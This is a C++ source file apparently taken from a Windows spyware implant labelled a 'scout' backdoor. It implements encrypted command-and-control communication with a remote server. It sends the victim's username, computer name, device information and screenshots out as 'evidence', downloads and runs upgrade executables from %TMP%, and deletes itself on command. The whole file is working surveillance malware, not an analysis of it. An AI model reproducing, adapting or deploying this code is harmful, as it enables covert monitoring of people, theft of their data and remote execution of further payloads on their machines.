#include <Windows.h>
#include <Sddl.h>
#include <winhttp.h>
#include <stdio.h>
#include <Lmcons.h>

#include "binpatched_vars.h"
#include "proto.h"
#include "md5.h"
#include "sha1.h"
#include "crypt.h"
#include "base64.h"
#include "win_http.h"
#include "upgrade.h"
#include "log_files.h"
#include "agent_device.h"
#include "agent_screenshot.h"
#include "main.h"


BYTE pServerKey[32];
BYTE pConfKey[32];
BYTE pSessionKey[20];
BYTE pLogKey[32];

extern PDEVICE_CONTAINER pDeviceContainer;


VOID SendEvidences()
{
	ULONG uHeaderSize;
	PBYTE pHeaderBuffer;

	// DEVICE FIRST 
	if (pDeviceContainer)
	{
		// payload
		ULONG a = Align(pDeviceContainer->uSize, 16);
		PBYTE pCryptedDeviceBuffer = (PBYTE)malloc(Align(pDeviceContainer->uSize, 16));
		memset(pCryptedDeviceBuffer, 0x0, Align(pDeviceContainer->uSize, 16));
		memcpy(pCryptedDeviceBuffer, pDeviceContainer->pDataBuffer, pDeviceContainer->uSize);
		Encrypt(pCryptedDeviceBuffer, Align(pDeviceContainer->uSize, 16), pLogKey, PAD_NOPAD);

		// header
		CreateLogFile(PM_DEVICEINFO, NULL, 0, FALSE, &pHeaderBuffer, &uHeaderSize);

		// total_len + header + payload_len_clear + payload
		PBYTE pBuffer = (PBYTE)malloc(sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(pDeviceContainer->uSize, 16)); 
		memset(pBuffer, 0x0, sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + pDeviceContainer->uSize);

		// total_len
		*(PULONG)pBuffer = sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(pDeviceContainer->uSize, 16);
		//header
		memcpy(pBuffer + sizeof(ULONG), pHeaderBuffer, uHeaderSize);

		// payload_len_clear
		*(PULONG)(pBuffer + sizeof(ULONG) + uHeaderSize) = Align(pDeviceContainer->uSize, 16);

		// payload
		memcpy(pBuffer + sizeof(ULONG) + uHeaderSize + sizeof(ULONG), pCryptedDeviceBuffer, Align(pDeviceContainer->uSize, 16));

		PBYTE pCryptedBuffer;
		if (WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_EVIDENCE, pBuffer, sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(pDeviceContainer->uSize, 16), pSessionKey, &pCryptedBuffer)))
		{
			ULONG uResponseLen;
			PBYTE pResponseBuffer = WinHTTPGetResponse(&uResponseLen); 
			if (pResponseBuffer)
			{
				Decrypt(pResponseBuffer, uResponseLen, pSessionKey);
				if (*(PULONG)pResponseBuffer == PROTO_OK)
				{
					free(pDeviceContainer->pDataBuffer);
					free(pDeviceContainer);
					pDeviceContainer = NULL;
				}
				free(pResponseBuffer);
			}
#ifdef _DEBUG
			else
				OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:81\n");
#endif
		}
#ifdef _DEBUG
		else
			OutputDebugString(L"[W] WinHTTPSendData FAIL @ proto.cpp:85\n");
#endif		
		free(pCryptedDeviceBuffer);
		free(pBuffer);
		
	}

	// SCREENSHOT
	ULONG uScreenShotLen;
	PBYTE pJPEGBuffer = TakeScreenshot(&uScreenShotLen);
	if (!pJPEGBuffer || !uScreenShotLen)
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] no pJPEGBuffer or uScreenShotLen!\n");
#endif
		return;
	}
	//payload
	pJPEGBuffer = (PBYTE)realloc(pJPEGBuffer, Align(uScreenShotLen, 16));
	Encrypt(pJPEGBuffer, Align(uScreenShotLen, 16), pLogKey, PAD_NOPAD);

	// additional header
	WCHAR pProcessName[] = L"UNKNOWN";

	ULONG uAddHeaderSize = sizeof(SNAPSHOT_ADDITIONAL_HEADER) + wcslen(pProcessName)*sizeof(WCHAR) + wcslen(pProcessName)*sizeof(WCHAR);
	PSNAPSHOT_ADDITIONAL_HEADER pSnapAddHeader = (PSNAPSHOT_ADDITIONAL_HEADER)malloc(uAddHeaderSize);

	pSnapAddHeader->uProcessNameLen = wcslen(pProcessName)*sizeof(WCHAR);
	pSnapAddHeader->uWindowNameLen = wcslen(pProcessName)*sizeof(WCHAR);
	pSnapAddHeader->uVersion = LOG_SNAP_VERSION;
	memcpy((PBYTE)pSnapAddHeader + sizeof(SNAPSHOT_ADDITIONAL_HEADER), pProcessName, pSnapAddHeader->uProcessNameLen);
	memcpy((PBYTE)pSnapAddHeader + sizeof(SNAPSHOT_ADDITIONAL_HEADER) + pSnapAddHeader->uProcessNameLen, pProcessName, pSnapAddHeader->uWindowNameLen);

	// header
	CreateLogFile(PM_SCREENSHOT, (PBYTE)pSnapAddHeader, uAddHeaderSize, FALSE, &pHeaderBuffer, &uHeaderSize);

	// total_len + header + payload_len_clear + payload
	PBYTE pBuffer = (PBYTE)malloc(sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(uScreenShotLen, 16)); 
	memset(pBuffer, 0x0, sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(uScreenShotLen, 16));

	// total_len
	*(PULONG)pBuffer = sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(uScreenShotLen, 16);

	//header
	memcpy(pBuffer + sizeof(ULONG), pHeaderBuffer, uHeaderSize);


	// payload_len_clear
	*(PULONG)(pBuffer + sizeof(ULONG) + uHeaderSize) = Align(uScreenShotLen, 16);

	// payload
	memcpy(pBuffer + sizeof(ULONG) + uHeaderSize + sizeof(ULONG), pJPEGBuffer, Align(uScreenShotLen, 16));

	PBYTE pCryptedBuffer;
	if (WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_EVIDENCE, pBuffer, sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(uScreenShotLen, 16), pSessionKey, &pCryptedBuffer)))
	{
		ULONG uResponseLen;
		PBYTE pResponseBuffer = WinHTTPGetResponse(&uResponseLen); 
		if (pResponseBuffer)
		{
			Decrypt(pResponseBuffer, uResponseLen, pSessionKey);
			if (*(PULONG)pResponseBuffer != PROTO_OK)
			{
#ifdef _DEBUG
				OutputDebugString(L"[!!] PROTO_ERR sending screenshot\n");
#endif
			}
			free(pResponseBuffer);
			free(pCryptedBuffer);
		}
#ifdef _DEBUG
		else
			OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:157\n");
#endif
	}
#ifdef _DEBUG
	else
		OutputDebugString(L"[!!] WinHTTPSendData FAIL @ proto.cpp:162\n");
#endif


	free(pBuffer);
	free(pJPEGBuffer);
	free(pSnapAddHeader);
}

BOOL SyncWithServer()
{
	PBYTE pRandomData, pProtoMessage, pInstanceId, pCryptedBuffer;
	ULONG uGonnaDie, uGonnaUpdate;
	BYTE pHashBuffer[20];
	BOOL bRetVal = TRUE;

	uGonnaDie = uGonnaUpdate = 0;

	memcpy(pServerKey, CLIENT_KEY, 32);
	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
#ifdef _DEBUG_BINPATCH
	MD5((PBYTE)CLIENT_KEY, 32, pServerKey);
	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, pConfKey);
#endif
	
	pRandomData = (PBYTE)malloc(16);
	GenerateRandomData(pRandomData, 16);

	PBYTE pBuffer = (PBYTE)malloc(32);
	memcpy(pBuffer, pConfKey, 16);
	memcpy(pBuffer + 16, pRandomData, 16);
	CalculateSHA1(pHashBuffer, pBuffer, 32);
	free(pBuffer);
	
	pInstanceId = (PBYTE)malloc(20);
	GetUserUniqueHash(pInstanceId, 20);

	// proto_v + rand + sha1(conf_key + rand) + bdoor_id(padded) + instance_id + subtype + randpool	
	ULONG uRandPoolLen = GetRandomInt(128, 1024);
	ULONG uCryptBufferLen = Align(sizeof(ULONG) + 16 + 20 + strlen(BACKDOOR_ID) + 2 + 20 + sizeof(ULONG), 16);
	ULONG uMessageLen = uCryptBufferLen + uRandPoolLen;
	pProtoMessage = (PBYTE)malloc(uMessageLen);
	PBYTE pMessageBuffer = pProtoMessage;

	// proto version
	*(PULONG)pMessageBuffer = 0x1; 
	pMessageBuffer += sizeof(ULONG);

	// kd
	memcpy(pMessageBuffer, pRandomData, 16);
	pMessageBuffer += 16;

	// sha1(conf_key + kd)
	memcpy(pMessageBuffer, pHashBuffer, 20);
	pMessageBuffer += 20;

	// backdoor_id
	memcpy(pMessageBuffer, BACKDOOR_ID, strlen(BACKDOOR_ID) + 2);
	pMessageBuffer += strlen(BACKDOOR_ID);
	memcpy(pMessageBuffer, "\x00\x00", 0x2); // 16 byte padding (id is 14byte fixed len)
	pMessageBuffer += 0x2;

	// instance id
	memcpy(pMessageBuffer, pInstanceId, 20);
	pMessageBuffer += 20;

	// subtype
	pMessageBuffer[0] = 0x0; // ARCH: windows
	pMessageBuffer[1] = 0x0; // STAGE: scout
	pMessageBuffer[2] = 0x1; // TYPE: release
	pMessageBuffer[3] = 0x0; // FLAG: reserved

	// encrypt
	Encrypt(pProtoMessage, uCryptBufferLen, pServerKey, PAD_NOPAD);

	// append random block
	GenerateRandomData(pProtoMessage + uCryptBufferLen, uRandPoolLen);

	// base64 everything
	PBYTE pBase64Message = (PBYTE)base64_encode(pProtoMessage, uMessageLen);

	// send request
	ULONG uResponseLen;
	ULONG uRet = WinHTTPSendData(pBase64Message, strlen((char *)pBase64Message));
	free(pBase64Message);
	if (!uRet)
	{
		free(pRandomData);
		free(pInstanceId);
		free(pProtoMessage);
#ifdef _DEBUG
		OutputDebugString(L"[!!] WinHTTPSendData FAIL @ proto.cpp:234\n");
#endif
		return FALSE;
	}

	// get response
	PBYTE pHttpResponseBufferB64 = WinHTTPGetResponse(&uResponseLen); 
	if (!pHttpResponseBufferB64)
	{
#ifdef _DEBUG
	OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:244\n");
#endif
		return FALSE;
	}

	// base64
	ULONG uOut;
	PBYTE pProtoResponse = base64_decode((char *)pHttpResponseBufferB64, uResponseLen, (int *)&uOut);
	free(pHttpResponseBufferB64);

	// decrypt
	Decrypt(pProtoResponse, uOut, pConfKey);

	// fill packet
	PROTO_RESPONSE_AUTH pProtoResponseId;
	memcpy(&pProtoResponseId, pProtoResponse, sizeof(PROTO_RESPONSE_AUTH));
	free(pProtoResponse);

	// first sha1
	pBuffer = (PBYTE)malloc(16 + sizeof(pProtoResponseId.pRandomData) + 16);
	memcpy(pBuffer, pConfKey, 16);
	memcpy(pBuffer + 16, pProtoResponseId.pRandomData, sizeof(pProtoResponseId.pRandomData));
	memcpy(pBuffer + 16 + sizeof(pProtoResponseId.pRandomData), pRandomData, 16);
	CalculateSHA1(pHashBuffer, pBuffer, 16 + sizeof(pProtoResponseId.pRandomData) + 16);
	free(pBuffer);
	
	PBYTE pFirstSha1Digest = (PBYTE)malloc(20);
	memcpy(pFirstSha1Digest, pHashBuffer, 20);

	// second sha1
	pBuffer = (PBYTE)malloc(20 + 16);
	memcpy(pBuffer, pFirstSha1Digest, 20);
	memcpy(pBuffer + 20, pProtoResponseId.pRandomData, sizeof(pProtoResponseId.pRandomData));
	CalculateSHA1(pHashBuffer, pBuffer, 20 + sizeof(pProtoResponseId.pRandomData));
	free(pBuffer);
	free(pFirstSha1Digest);

	if (memcmp(pHashBuffer, pProtoResponseId.pSha1Digest, 20))
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] Ouch SHA1 does not match !!!\n");
#endif
		bRetVal = FALSE;
		goto bailout;
	}


	// AUTH DONE \o/
#ifdef _DEBUG
	OutputDebugString(L"[+] PROTO_AUTH succeded !!\n");
#endif

	// session key sha1(conf_key + ks + kd)
	pBuffer = (PBYTE)malloc(48); 
	memcpy(pBuffer, pConfKey, 16);
	memcpy(pBuffer + 16, pProtoResponseId.pRandomData, 16);
	memcpy(pBuffer + 16 + 16, pRandomData, 16);
	CalculateSHA1(pSessionKey, pBuffer, 48);
	free(pBuffer);

	if (pProtoResponseId.uProtoCommand != PROTO_OK && pProtoResponseId.uProtoCommand != PROTO_NO && pProtoResponseId.uProtoCommand != PROTO_UNINSTALL)
	{
#ifdef _DEBUG
		PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
		swprintf_s(pDebugString, 1024, L"[!!] Invalid PROTO command %08x", pProtoResponseId.uProtoCommand);
		OutputDebugString(pDebugString);
		free(pDebugString);
#endif

		bRetVal = FALSE;
		goto bailout;
	}
	

	if (pProtoResponseId.uProtoCommand == PROTO_NO)
	{
		bRetVal = FALSE;
		goto bailout;
	}
	else if (pProtoResponseId.uProtoCommand == PROTO_UNINSTALL)
	{
#ifdef _DEBUG
		OutputDebugString(L"[+] Got PROTO_UNINSTALL, I'm gonna die :(\n");
#endif
		WinHTTPClose();
		DeleteAndDie();
	}


	// send ID
	ULONG uStringLong = 32767 * sizeof(WCHAR);
	PWCHAR pUserName = (PWCHAR)malloc(uStringLong);
	PWCHAR pComputerName = (PWCHAR)malloc(uStringLong);

	if (!GetEnvironmentVariable(L"USERNAME", pUserName, uStringLong))
		pUserName[0] = L'\0';
	if (!GetEnvironmentVariable(L"COMPUTERNAME", pComputerName, uStringLong))
		pComputerName[0] = L'\0';

	// Prepare ID buffer
	ULONG uUserLen, uComputerLen, uSourceLen = 0;	
	PBYTE pUserNamePascal = PascalizeString(pUserName, &uUserLen);
	PBYTE pComputerNamePascal = PascalizeString(pComputerName, &uComputerLen);
	PBYTE pSourceIdPascal = PascalizeString(L"", &uSourceLen);
	free(pUserName);
	free(pComputerName);

	ULONG uBuffLen = sizeof(ULONG) + uUserLen + uComputerLen + uSourceLen;
	pBuffer = (PBYTE)malloc(uBuffLen);
	*(PULONG)pBuffer = SCOUT_VERSION;
	memcpy(pBuffer + sizeof(ULONG), pUserNamePascal, uUserLen);
	memcpy(pBuffer + sizeof(ULONG) + uUserLen, pComputerNamePascal, uComputerLen);
	memcpy(pBuffer + sizeof(ULONG) + uUserLen + uComputerLen, pSourceIdPascal, uSourceLen);

	// Send ID
	if (!WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_ID, pBuffer, uBuffLen, pSessionKey, &pCryptedBuffer)))
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] WinHTTPSendData @ proto.cpp:381\n");
#endif
		goto bailout;
	}
	free(pCryptedBuffer);
	free(pBuffer);	

	// Get reponse
	PBYTE pHttpResponseBuffer = WinHTTPGetResponse(&uResponseLen); 
	if (!pHttpResponseBuffer)
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:387\n");
#endif
		goto bailout;
	}
	// decrypt it
	Decrypt(pHttpResponseBuffer, uResponseLen, pSessionKey);

	PPROTO_RESPONSE_ID pResponseId = (PPROTO_RESPONSE_ID)pHttpResponseBuffer;
#ifdef _DEBUG
	PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
	swprintf_s(pDebugString, 1024, L"[+] Got PROTO_ID PROTO - uProtoCommand: %08x, uMessageLen: %08x, uAvailables: %d\n", 
		pResponseId->uProtoCommand, 
		pResponseId->uMessageLen, 
		pResponseId->uAvailables);
	OutputDebugString(pDebugString);
	free(pDebugString);
#endif
	
	// parse availables
	if (pResponseId->uAvailables)
	{
		PULONG pAvailables = (&pResponseId->uAvailables) + 1;
		for (ULONG i=0; i<pResponseId->uAvailables; i++)
		{
#ifdef _DEBUG
			pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
			swprintf_s(pDebugString, 1024, L"  - Available %08x\n", pAvailables[i]);
			OutputDebugString(pDebugString);
			free(pDebugString);
#endif
			// AVAILABLE STUFF HERE THERE AND EVERYWHERE
			if (pAvailables[i] == PROTO_UPGRADE)
			{
#ifdef _DEBUG
				pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
				swprintf_s(pDebugString, 1024, L"[+] Got PROTO_UPGRADE, requesting executables\n");
				OutputDebugString(pDebugString);
				free(pDebugString);
#endif
				if (!WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_UPGRADE, NULL, 0, pSessionKey, &pCryptedBuffer)))
				{
#ifdef _DEBUG
					OutputDebugString(L"[!!] WinHTTPSendData FAIL @proto.cpp:435\n");
					break;
#endif
				}
				free(pCryptedBuffer);

				PBYTE pHttpUpgradeBuffer = WinHTTPGetResponse(&uResponseLen); 
				if (!pHttpUpgradeBuffer)
				{
#ifdef _DEBUG
					OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:433\n");
#endif
					break;
				}
				Decrypt(pHttpUpgradeBuffer, uResponseLen, pSessionKey);

				PPROTO_RESPONSE_UPGRADE pProtoUpgrade = (PPROTO_RESPONSE_UPGRADE)pHttpUpgradeBuffer;
				PWCHAR pUpgradeName = (PWCHAR)malloc(pProtoUpgrade->uUpgradeNameLen);
				memcpy(pUpgradeName, &pProtoUpgrade->pUpgradeNameBuffer, pProtoUpgrade->uUpgradeNameLen);
#ifdef _DEBUG
				pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
				swprintf_s(pDebugString, 1024, L"[+] PROTO_UPGRADE - uProtoCommand: %08x, uResponseLen: %x, uUpgradeLeft: %d, uUpgradeNameLen: %d, pUpgradeName: %s\n", 
					pProtoUpgrade->uProtoCommand, pProtoUpgrade->uResponseLen, pProtoUpgrade->uUpgradeLeft, pProtoUpgrade->uUpgradeNameLen, pUpgradeName);
				OutputDebugString(pDebugString);
				free(pDebugString);
#endif
				PWCHAR pUpgradePath = (PWCHAR)malloc((32767 * sizeof(WCHAR)) + pProtoUpgrade->uUpgradeNameLen);
				GetEnvironmentVariable(L"TMP", pUpgradePath, 32767 * sizeof(WCHAR));
				wcscat_s(pUpgradePath, 32767 + (pProtoUpgrade->uUpgradeNameLen/sizeof(WCHAR)), L"\\");

				PWCHAR pRandString = GetRandomString(5);
				wcscat_s(pUpgradePath, 32767 + (pProtoUpgrade->uUpgradeNameLen/sizeof(WCHAR)), pRandString);
				wcscat_s(pUpgradePath, 32767 + (pProtoUpgrade->uUpgradeNameLen/sizeof(WCHAR)), L".tmp");

				ULONG uFileLength = *(PULONG) (((PBYTE)&pProtoUpgrade->pUpgradeNameBuffer) + pProtoUpgrade->uUpgradeNameLen);
				PBYTE pFileBuffer = (PBYTE)(((PBYTE)&pProtoUpgrade->pUpgradeNameBuffer) + pProtoUpgrade->uUpgradeNameLen) + sizeof(ULONG);

				// upgrade & exit
				if (Upgrade(pUpgradePath, pFileBuffer, uFileLength))
					uGonnaDie = 1;

				free(pRandString);
				free(pUpgradePath);
				free(pUpgradeName);
				free(pHttpUpgradeBuffer);
			}
		}
	}
	free(pHttpResponseBuffer);

#ifdef _DEBUG
	OutputDebugString(L"[+] Sending Evidences\n");
#endif
	SendEvidences();
	
bailout:
	// send BYE
#ifdef _DEBUG
	OutputDebugString(L"[*] Sending PROTO_BYE\n");
#endif
	if (WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_BYE, NULL, 0, pSessionKey, &pCryptedBuffer)))
		free(pCryptedBuffer);
#ifdef _DEBUG
	else
		OutputDebugString(L"[!!] WinHTTPSendData FAIL @ proto.cpp:499\n");
#endif
	

	if (uGonnaDie)
	{
		WinHTTPClose();
		DeleteAndDie();
	}

	free(pProtoMessage);
	free(pInstanceId);
	free(pRandomData);

	return bRetVal;
}

VOID CalculateSHA1(PBYTE pSha1Buffer, PBYTE pBuffer, ULONG uBufflen)
{
	SHA1Context pSha1Context;

	SHA1Reset(&pSha1Context);
	SHA1Input(&pSha1Context, pBuffer, uBufflen);
	SHA1Result(&pSha1Context);

	for(ULONG x=0; x<5; x++)
		((PULONG)pSha1Buffer)[x] = ntohl(pSha1Context.Message_Digest[x]);
}


ULONG CommandHash(ULONG uProtoCmd, PBYTE pMessage, ULONG uMessageLen, PBYTE pEncryptionKey, PBYTE *pOutBuff)
{
	ULONG uOut, uOutClear;
	PBYTE pBuffer, pOutBuffer;
	BYTE pSha1Digest[20];

	uOutClear = sizeof(ULONG) + uMessageLen + 20;
	uOut = uOutClear;
	if (uOut % 16)
		uOut += 16 - (uOut % 16);
	else
		uOut += 16;
	
	// sha1(PROTO_* + version + message)
	pBuffer = (PBYTE)malloc(sizeof(ULONG) + uMessageLen);	// FIXME: free this
	*(PULONG)pBuffer = uProtoCmd;
	if (pMessage)
		memcpy(pBuffer + sizeof(ULONG), pMessage, uMessageLen);
	CalculateSHA1(pSha1Digest, pBuffer, uMessageLen + sizeof(ULONG));

	// clear-text(cmd + message + sha1)
	pOutBuffer = (PBYTE)malloc(uOut); // FIXME user pBuffer && realloc here
	*(PULONG)pOutBuffer = uProtoCmd;
	if (pMessage)
		memcpy(pOutBuffer + sizeof(ULONG), pMessage, uMessageLen);
	memcpy(pOutBuffer + sizeof(ULONG) + uMessageLen, pSha1Digest, 20);

	Encrypt(pOutBuffer, uOutClear, pEncryptionKey, PAD_PKCS5);

	*pOutBuff = pOutBuffer;
	return uOut;
}



BOOL GetUserUniqueHash(PBYTE pUserHash, ULONG uHashSize)
{
	HANDLE hToken=0;
	PTOKEN_USER pTokenOwner=NULL;
	DWORD dwLen=0;
	LPSTR pStringSid;
	BOOL bRetVal = FALSE;

	if (!pUserHash)
		return FALSE;
	memset(pUserHash, 0, uHashSize);
	if (uHashSize < SHA_DIGEST_LENGTH)
		return FALSE;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY| TOKEN_QUERY_SOURCE, &hToken)) 
	{
		GetTokenInformation(hToken, TokenUser, pTokenOwner, 0, &dwLen);
		if (dwLen)
			pTokenOwner = (PTOKEN_USER)malloc(dwLen);
		if (pTokenOwner) 
		{
			memset(pTokenOwner, 0, dwLen);
			if (GetTokenInformation(hToken, TokenUser, pTokenOwner, dwLen, &dwLen) &&
				ConvertSidToStringSidA(pTokenOwner->User.Sid, &pStringSid)) 
			{
				SHA1Context sha;
				SHA1Reset(&sha);
				SHA1Input(&sha, (PBYTE)pStringSid, (DWORD)(strlen(pStringSid)));
				if (SHA1Result(&sha)) 
				{
					for (int i=0; i<5; i++)
						sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
					memcpy(pUserHash, sha.Message_Digest, SHA_DIGEST_LENGTH);
					bRetVal = TRUE;
				}
				LocalFree(pStringSid);
			}
			free(pTokenOwner);
		}
		CloseHandle(hToken);
	}
	return bRetVal;
}

ULONG GetRandomInt(ULONG uMin, ULONG uMax)
{
	static BOOL uFirstTime = TRUE;

	if (uFirstTime)
	{
		srand(GetTickCount());
		uFirstTime = FALSE;
	}

	return (rand()%(uMax-uMin))+uMin;
}

PWCHAR GetRandomString(ULONG uMin)
{
	PWCHAR pString = (PWCHAR)malloc((uMin + 64) * sizeof(WCHAR));
	pString[0] = L'\0';

	while(wcslen(pString) < uMin)
	{
		WCHAR pSubString[32] = { 0x0, 0x0 };

		_itow_s(GetRandomInt(1, 0xffffff), pSubString, 6, 0x10);
		wcscat_s(pString, uMin + 64, pSubString);
	}

	return pString;
}

VOID GenerateRandomData(PBYTE pBuffer, ULONG uBuffLen)
{
	static BOOL uFirstTime = TRUE;
	ULONG i;

	if (uFirstTime) {
		srand(GetTickCount());
		uFirstTime = FALSE;
	}

	for (i=0; i<uBuffLen; i++)
		pBuffer[i] = rand();
}



ULONG Align(ULONG uSize, ULONG uAlignment)
{
	return (((uSize + uAlignment - 1) / uAlignment) * uAlignment);
}


PBYTE PascalizeString(PWCHAR pString, PULONG uOutLen)
{
	ULONG uLen;
	PBYTE pBuffer;

	uLen = (wcslen(pString)+1) * sizeof(WCHAR);
	pBuffer = (PBYTE)malloc(uLen + sizeof(ULONG));
	SecureZeroMemory(pBuffer, uLen + sizeof(ULONG));

	*(PULONG)pBuffer = uLen;
	wcscpy_s((PWCHAR)(pBuffer + sizeof(ULONG)), uLen/sizeof(WCHAR), pString); 

	*uOutLen = uLen + sizeof(ULONG);
	return pBuffer;
}